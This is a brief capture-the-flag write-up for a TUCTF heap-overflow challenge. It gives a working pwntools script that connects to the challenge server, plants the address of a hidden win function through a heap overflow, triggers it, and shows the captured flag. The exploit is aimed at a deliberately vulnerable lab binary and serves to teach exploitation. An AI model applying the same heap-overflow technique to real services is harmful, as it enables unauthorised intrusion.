### Solved by superkojiman

This was supposed to be a fixed version of woO2, I think. Maybe I solved the first one the uninteded way, but I was able to solve this one in the exact same way. The only difference was the address of 1337Hax0r() was different. So here's the updated exploit:

```
#!/usr/bin/env python
from pwn import *

flag = p64(0x004008dd)

r = remote("104.196.15.126", 15050)

r.recvuntil("choice:")
r.sendline("2")
r.recvuntil("Caspian Tiger")
r.sendline("3")
r.recvuntil(":")
r.sendline(flag)

r.recvuntil("choice:")
r.sendline("2")
r.recvuntil("Caspian Tiger")
r.sendline("4")
r.recvuntil(":")
r.sendline("bbbbbb")


r.recvuntil("choice:")
r.sendline("4919")

print r.recvall()
```

And here's the flag:

```
# ./sploit.py
[+] Opening connection to 104.196.15.126 on port 15050: Done
[+] Recieving all data: Done (25B)
[*] Closed connection to 104.196.15.126 port 15050

TUCTF{H3ap_O_Fl0w_ftw}
```
